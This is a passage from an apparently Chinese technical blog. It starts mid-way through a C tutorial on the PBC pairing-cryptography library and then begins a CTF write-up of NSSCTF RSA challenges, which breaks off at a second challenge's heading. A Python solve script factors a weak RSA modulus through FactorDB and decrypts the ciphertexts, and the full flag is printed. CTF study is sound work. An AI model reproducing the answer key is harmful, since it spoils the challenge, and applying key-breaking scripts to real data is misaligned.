class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pbc/pbc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPEA_PARAMS                                           \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;type a\n&quot;</span>                                                 \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;q 87807107996633125224377819847540498158068831994142082&quot;</span>  \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;1102865339926647563088022295707862517942266222142315585&quot;</span>  \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;8769582317459277713367317481324925129998224791\n&quot;</span>         \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;h 12016012264891146079388821366740534204802954401251311&quot;</span>  \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;822919615131047207289359704531102844802183906537786776\n&quot;</span> \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;r 730750818665451621361119245571504901405976559617\n&quot;</span>     \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;exp2 159\n&quot;</span>                                               \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;exp1 107\n&quot;</span>                                               \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;sign1 1\n&quot;</span>                                                \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;sign0 1\n&quot;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">pairing_t</span> pairing;<br>    pairing_init_set_buf(pairing, TYPEA_PARAMS, <span class="hljs-built_in">strlen</span>(TYPEA_PARAMS));<br><span class="hljs-comment">// 定义群元素</span><br>    <span class="hljs-type">element_t</span> g, h, result1, result2, result3;<br>    <span class="hljs-type">element_t</span> a, b;<br><br>    <span class="hljs-comment">// 初始化群元素</span><br>    element_init_G1(g, pairing);<br>    element_init_G1(h, pairing);<br>    element_init_GT(result1, pairing);<br>    element_init_GT(result2, pairing);<br>    element_init_GT(result3, pairing);<br>    element_init_Zr(a, pairing);<br>    element_init_Zr(b, pairing);<br><br>    <span class="hljs-comment">// 生成随机元素</span><br>    element_random(g);<br>    element_random(h);<br>    element_random(a);<br>    element_random(b);<br><br>    <span class="hljs-comment">// 计算e(g,h)^(a*b)</span><br>    pairing_apply(result3, g, h, pairing);<br>    element_pow_zn(result3, result3, a);<br>    element_pow_zn(result3, result3, b);<br><br>    <span class="hljs-comment">// 计算g^a和g^b</span><br>    element_pow_zn(g, g, a);<br>    element_pow_zn(h, h, b);<br><br>    <span class="hljs-comment">// 计算e(g^a, h^b)</span><br>    pairing_apply(result1, g, h, pairing);<br>    pairing_apply(result2, h, g, pairing);<br><br><br><br>    <span class="hljs-comment">// 输出结果</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Result of pairing e(g^a, h^b): &quot;</span>);<br>    element_printf(<span class="hljs-string">&quot;%B\n&quot;</span>, result1);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Result of pairing e(h^b, g^a): &quot;</span>);<br>    element_printf(<span class="hljs-string">&quot;%B\n&quot;</span>, result2);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Result of pairing e(g, h)^(a*b): &quot;</span>);<br>    element_printf(<span class="hljs-string">&quot;%B\n&quot;</span>, result3);<br><br>    <span class="hljs-comment">// 清理元素</span><br>    element_clear(g);<br>    element_clear(h);<br>    element_clear(result1);<br>    element_clear(result2);<br>    element_clear(result3);<br>    element_clear(a);<br>    element_clear(b);<br>    pairing_clear(pairing);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="使用"><a class="markdownIt-Anchor" href="#使用"></a> 使用</h2><h3 id="pairing初始化"><a class="markdownIt-Anchor" href="#pairing初始化"></a> pairing初始化</h3><p>双线性配对一般使用的是pbc库中的Type-A<br />这一部分算是固定的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPEA_PARAMS                                           \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;type a\n&quot;</span>                                                 \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;q 87807107996633125224377819847540498158068831994142082&quot;</span>  \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;1102865339926647563088022295707862517942266222142315585&quot;</span>  \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;8769582317459277713367317481324925129998224791\n&quot;</span>         \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;h 12016012264891146079388821366740534204802954401251311&quot;</span>  \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;822919615131047207289359704531102844802183906537786776\n&quot;</span> \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;r 730750818665451621361119245571504901405976559617\n&quot;</span>     \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;exp2 159\n&quot;</span>                                               \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;exp1 107\n&quot;</span>                                               \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;sign1 1\n&quot;</span>                                                \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;sign0 1\n&quot;</span></span><br><br><span class="hljs-type">pairing_t</span> pairing;<br>pairing_init_set_buf(pairing, TYPEA_PARAMS, <span class="hljs-built_in">strlen</span>(TYPEA_PARAMS));<br></code></pre></td></tr></table></figure><h3 id="元素初始化"><a class="markdownIt-Anchor" href="#元素初始化"></a> 元素初始化</h3><p>一个pairing里有一般有两个群<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>G</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>G</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">G_1,G_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。按官方说法，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>G</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">G_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>为小的那个群，使用的时候看具体情况。<br />元素初始化有这么几个函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">element_init_G1</span><span class="hljs-params">(<span class="hljs-type">element_t</span> e, <span class="hljs-type">pairing_t</span> pairing)</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">element_init_G2</span><span class="hljs-params">(<span class="hljs-type">element_t</span> e, <span class="hljs-type">pairing_t</span> pairing)</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">element_init_GT</span><span class="hljs-params">(<span class="hljs-type">element_t</span> e, <span class="hljs-type">pairing_t</span> pairing)</span><br>    Initialize e to be an element of the group G1, G2 or GT of pairing.<br>    这个一般是用于最后配对的结果。<br><span class="hljs-type">void</span> <span class="hljs-title function_">element_init_Zr</span><span class="hljs-params">(<span class="hljs-type">element_t</span> e, <span class="hljs-type">pairing_t</span> pairing)</span><br>    Initialize e to be an element of the ring Z_r of pairing. r is the order of the groups G1, G2 and GT that are involved in the pairing.<br>    一般用于指数部分。<br><span class="hljs-type">void</span> <span class="hljs-title function_">element_init_same_as</span><span class="hljs-params">(<span class="hljs-type">element_t</span> e, <span class="hljs-type">element_t</span> e2)</span><br>    Initialize e to be an element of the algebraic structure that e2 lies in.<br><span class="hljs-type">void</span> <span class="hljs-title function_">element_clear</span><span class="hljs-params">(<span class="hljs-type">element_t</span> e)</span><br>    Free the space occupied by e. Call this when the variable e is no longer needed.<br></code></pre></td></tr></table></figure><p>在初始化后就可以对元素进行各种操作啦。</p><h3 id="元素赋值"><a class="markdownIt-Anchor" href="#元素赋值"></a> 元素赋值</h3><p>pbc中有很多赋值操作，非常灵活：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">element_set0</span><span class="hljs-params">(<span class="hljs-type">element_t</span> e)</span><br>    Set e to zero.<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">element_set1</span><span class="hljs-params">(<span class="hljs-type">element_t</span> e)</span><br>    Set e to one.<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">element_set_si</span><span class="hljs-params">(<span class="hljs-type">element_t</span> e, <span class="hljs-type">signed</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> i)</span><br>    Set e to i.<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">element_set</span><span class="hljs-params">(<span class="hljs-type">element_t</span> e, <span class="hljs-type">element_t</span> a)</span><br>    Set e to a.<br><br>可以跟GMP库中的<span class="hljs-type">mpz_t</span>互相转换<br><span class="hljs-type">void</span> <span class="hljs-title function_">element_set_mpz</span><span class="hljs-params">(<span class="hljs-type">element_t</span> e, <span class="hljs-type">mpz_t</span> z)</span><br>    Set e to z.<br><span class="hljs-type">void</span> <span class="hljs-title function_">element_to_mpz</span><span class="hljs-params">(<span class="hljs-type">mpz_t</span> z, <span class="hljs-type">element_t</span> e)</span><br>    Converts e to a GMP integer z <span class="hljs-keyword">if</span> such an operation makes sense<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">element_from_hash</span><span class="hljs-params">(<span class="hljs-type">element_t</span> e, <span class="hljs-type">void</span> *data, <span class="hljs-type">int</span> len)</span><br>    Generate an element e deterministically from the len bytes stored in the buffer data.<br>    使用时候要强制将data转为<span class="hljs-type">void</span> *：<span class="hljs-title function_">element_from_hash</span><span class="hljs-params">(e, (<span class="hljs-type">void</span> *)hash_str, hash_str_length)</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">element_random</span><span class="hljs-params">(<span class="hljs-type">element_t</span> e)</span>;<br>    随机选取群中元素<br><br></code></pre></td></tr></table></figure><h3 id="运算"><a class="markdownIt-Anchor" href="#运算"></a> 运算</h3><p>这里就列举一些常用的运算</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//加法n=a+b</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">element_add</span><span class="hljs-params">(<span class="hljs-type">element_t</span> n, <span class="hljs-type">element_t</span> a, <span class="hljs-type">element_t</span> b)</span>;<br><br><span class="hljs-comment">//减法n=a-b</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">element_sub</span><span class="hljs-params">(<span class="hljs-type">element_t</span> n, <span class="hljs-type">element_t</span> a, <span class="hljs-type">element_t</span> b)</span>;<br><br><span class="hljs-comment">//乘法n=a*b</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">element_mul</span><span class="hljs-params">(<span class="hljs-type">element_t</span> n, <span class="hljs-type">element_t</span> a, <span class="hljs-type">element_t</span> b)</span>;<br><br><span class="hljs-comment">//数乘n=z*a</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">element_mul_mpz</span><span class="hljs-params">(<span class="hljs-type">element_t</span> n, <span class="hljs-type">element_t</span> a, <span class="hljs-type">mpz_t</span> z)</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">element_mul_si</span><span class="hljs-params">(<span class="hljs-type">element_t</span> n, <span class="hljs-type">element_t</span> a, <span class="hljs-type">signed</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> z)</span>;<br><br><br><span class="hljs-comment">//元素数乘n=z*a</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">element_mul_zn</span><span class="hljs-params">(<span class="hljs-type">element_t</span> c, <span class="hljs-type">element_t</span> a, <span class="hljs-type">element_t</span> z)</span>;<br><span class="hljs-comment">//注意这里的元素z必须为整数mod环，即Zr下。</span><br><span class="hljs-comment">//即z经过element_init_Zr(element_t e, pairing_t pairing)</span><br><br><span class="hljs-comment">//除法n=a/b</span><br> <span class="hljs-type">void</span> <span class="hljs-title function_">element_div</span><span class="hljs-params">(<span class="hljs-type">element_t</span> n, <span class="hljs-type">element_t</span> a, <span class="hljs-type">element_t</span> b)</span>;<br><br><span class="hljs-comment">//倒数or逆元n=a^&#123;-1&#125;</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">element_invert</span><span class="hljs-params">(<span class="hljs-type">element_t</span> n, <span class="hljs-type">element_t</span> a)</span>;<br><br><span class="hljs-comment">//幂or次方x=a^n,n为Zr下的</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">element_pow_zn</span><span class="hljs-params">(<span class="hljs-type">element_t</span> x, <span class="hljs-type">element_t</span> a, <span class="hljs-type">element_t</span> n)</span>;<br><br><span class="hljs-comment">//等于a==b,等于返回0，不等于返回1</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">element_cmp</span><span class="hljs-params">(<span class="hljs-type">element_t</span> a, <span class="hljs-type">element_t</span> b)</span>;<br><br></code></pre></td></tr></table></figure><h3 id="元素输出"><a class="markdownIt-Anchor" href="#元素输出"></a> 元素输出</h3><p>这里就说一下我用过的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">element_printf</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *format, …)</span>;<br>    一般用法为 element_printf(<span class="hljs-string">&quot;%B\n&quot;</span>,e);<br><br>下面这三个函数我用来将元素保存为文件<br><span class="hljs-type">int</span> <span class="hljs-title function_">element_length_in_bytes</span><span class="hljs-params">(<span class="hljs-type">element_t</span> e)</span><br>    Returns the length in bytes the element e will take to represent<br><span class="hljs-type">int</span> <span class="hljs-title function_">element_to_bytes</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *data, <span class="hljs-type">element_t</span> e)</span><br>    Converts e to byte, writing the result in the buffer data. The number of bytes it will write can be determined from calling <span class="hljs-title function_">element_length_in_bytes</span><span class="hljs-params">()</span>. Returns number of bytes written.<br><span class="hljs-type">int</span> <span class="hljs-title function_">element_from_bytes</span><span class="hljs-params">(<span class="hljs-type">element_t</span> e, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *data)</span><br>    Reads e from the buffer data, and returns the number of bytes read.<br>我用GPT生成的使用方法（亲测可用）：<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_element_to_file</span><span class="hljs-params">(<span class="hljs-type">element_t</span> e, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename)</span><br>&#123;<br>    <span class="hljs-type">int</span> size = element_length_in_bytes(e);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *data = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(size);<br><br>    element_to_bytes(data, e);<br>    FILE *file = fopen(filename, <span class="hljs-string">&quot;wb&quot;</span>);<br>    <span class="hljs-keyword">if</span> (file != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        fwrite(data, <span class="hljs-number">1</span>, size, file);<br>        fclose(file);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(data);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">load_element_from_file</span><span class="hljs-params">(<span class="hljs-type">element_t</span> e, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename)</span><br>&#123;<br>    <span class="hljs-type">int</span> size = element_length_in_bytes(e);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *data = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(size);<br><br>    FILE *file = fopen(filename, <span class="hljs-string">&quot;rb&quot;</span>);<br>    <span class="hljs-keyword">if</span> (file != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        fread(data, <span class="hljs-number">1</span>, size, file);<br>        element_from_bytes(e, data);<br>        fclose(file);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(data);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>c</category>
      
      <category>PBC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>c</tag>
      
      <tag>PBC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Xenny的RSA题单</title>
    <link href="/2024/12/05/XennyRSA/"/>
    <url>/2024/12/05/XennyRSA/</url>
    
    <content type="html"><![CDATA[<h1 id="题目地址"><a class="markdownIt-Anchor" href="#题目地址"></a> 题目地址：</h1><p><a href="https://www.nssctf.cn/problem/sheet/6">Xenny的RSA题单 | NSSCTF</a></p><h1 id="柏鹭杯-2021试试大数据分解"><a class="markdownIt-Anchor" href="#柏鹭杯-2021试试大数据分解"></a> [柏鹭杯 2021]试试大数据分解?</h1><h2 id="题目"><a class="markdownIt-Anchor" href="#题目"></a> 题目</h2><p>public.pem</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-params">-----BEGIN</span> PUBLIC KEY<span class="hljs-params">-----</span><br>MEEwDQYJKoZIhvcNAQEBBQADMAAwLQImB7P6jgDCkl34tsJ1D1oiGKDHVvftOEqX<br><span class="hljs-string">/N1kT/dj9UyNNJkEELECAwGGlw==</span><br><span class="hljs-params">-----END</span> PUBLIC KEY<span class="hljs-params">-----</span><br></code></pre></td></tr></table></figure><p>flag.enc1</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">BhUX<span class="hljs-meta">O8</span>RZzppFl<span class="hljs-number">7</span>Fw<span class="hljs-number">72</span>jbGkEIaH/<span class="hljs-number">6</span>/D<span class="hljs-number">5</span>c<span class="hljs-number">00</span>bYx<span class="hljs-number">1</span>HEAPf<span class="hljs-symbol">N5</span>+BeRII=<br></code></pre></td></tr></table></figure><p>flag.enc2</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">BSiVik1bo999kG2eHzZaVt056rh74oRbbU99OrIE48ds9kQ6AR4</span><span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>flag.enc3</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">BbGPmOvTr8OYCIgwyEpu5b26jGUY2EHZRu2FUSK/cdUmK0Wqkhc<span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>flag.enc4</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">Axu<span class="hljs-symbol">n6</span>PS<span class="hljs-number">3</span>aheoX<span class="hljs-number">8</span><span class="hljs-meta">o3</span><span class="hljs-name">G8</span>e<span class="hljs-number">3</span>mtAxHC+C<span class="hljs-number">6</span>r<span class="hljs-number">95</span>oV<span class="hljs-number">84</span>OQ<span class="hljs-number">8</span>dxsFsx<span class="hljs-symbol">nYcfo0</span>=<br></code></pre></td></tr></table></figure><h2 id="分析"><a class="markdownIt-Anchor" href="#分析"></a> 分析</h2><p>题目给了公钥文件，然后四个密文，经过了base64编码</p><p>我们先读取公钥文件，得到e和n，看到n比较小，在facetordb中可以进行分解，可以得到p,q</p><p>后面进行常规的rsa解密</p><p>但是打印出m后发现不是直接的flag</p><p>观察到第一串\00字节后面666c开头，应该就是flag</p><p>手动提取了一下每一串\00后面的就行了</p><h2 id="exp"><a class="markdownIt-Anchor" href="#exp"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> factordb.factordb <span class="hljs-keyword">import</span> FactorDB<br>public_key=RSA.importKey(<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./public.pem&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read())<br><br>E=public_key.e<br>N=public_key.n<br><span class="hljs-built_in">print</span>(E)<br><span class="hljs-built_in">print</span>(N)<br><br>f=FactorDB(N)<br>f.connect()<br>p,q=f.get_factor_list()<br>c=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    c.append(bytes_to_long(b64decode((<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.enc&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(i+<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;rb&#x27;</span>).read()))))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c:<br>    <span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(i,invert(E,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)),N)))<br><span class="hljs-string">&quot;&quot;&quot;b&#x27;\x02\x88b4Kt\xe4\x1cI\xcf\x8fw/&quot;\x00666c61677b495345432d49&#x27;</span><br><span class="hljs-string">b&#x27;\x02\x1b\xf3\x18\xaf\xe1\xe3\xc7\x19\xa0\x05\xac\xe0N\x007235574d5f473441666276&#x27;</span><br><span class="hljs-string">b&#x27;\x025\x89;\xb0\xbd\x96\tU@\xf2\x0b\xe7+\x00785f6d534d5f556766387a&#x27;</span><br><span class="hljs-string">b&#x27;\x02\xfcu\xcb\n\xcf\x97\x0f\x9e\xbbC\x11\xd7\xdbw\xd9\x0052416f4d6b594350787d&#x27;&quot;&quot;&quot;</span><br>a=<span class="hljs-number">0x666c61677b495345432d497235574d5f473441666276785f6d534d5f556766387a52416f4d6b594350787d</span><br><span class="hljs-built_in">print</span>(long_to_bytes(a))<br><span class="hljs-comment">#b&#x27;flag&#123;ISEC-Ir5WM_G4Afbvx_mSM_Ugf8zRAoMkYCPx&#125;&#x27;</span><br><span class="hljs-comment">#NSSCTF&#123;ISEC-Ir5WM_G4Afbvx_mSM_Ugf8zRAoMkYCPx&#125;</span><br></code></pre></td></tr></table></figure><h1 id="黑盾杯-2020factor"><a class="markdownIt-Anchor" href="#黑盾杯-2020factor"></a> [黑盾杯 2020]Factor</h1><h2 id="题目-2"><a class="markdownIt-Anchor" href="#题目-2"></a> 题目</h2><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">n</span> <span class="hljs-operator">=</span> <span class="hljs-number">3454083680130687060405946528826790951695785465926614724373</span><br><span class="hljs-attribute">e</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span><br><span class="hljs-attribute">c</span> <span class="hljs-operator">=</span> <span class="hljs-number">1347530713288996422676156069761604101177635382955634367208</span><br></code></pre></td></tr></table></figure><h2 